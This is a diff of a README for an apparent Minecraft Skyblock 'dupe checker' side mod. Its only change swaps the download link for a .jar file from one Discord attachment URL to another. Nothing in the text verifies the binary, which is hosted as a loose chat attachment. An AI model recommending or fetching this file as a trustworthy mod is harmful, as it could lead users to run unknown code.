@@ -11,7 +11,7 @@ This mod adds High-Value Dupe checker into your skyblock experience.
 A side mod of Skytils/Sbe, An amazing Dupe Checker.
 although SBE and Skytils are better in different aspects, NBT is better overall for dupe checking, as skytils and SBE's api lacks in quality.
 
-This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/972497291116179456/973515640046489670/SmileCrystalDupeChecker-1.0.jar)
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/951846446972412004/973573128896802826/SmileCrystalDupeChecker-1.0.jar)
 
 ### Update 2.1.3
 Skytils Support, Better api, Faster response time, Cleaner GUI, 1.7.5 is here.
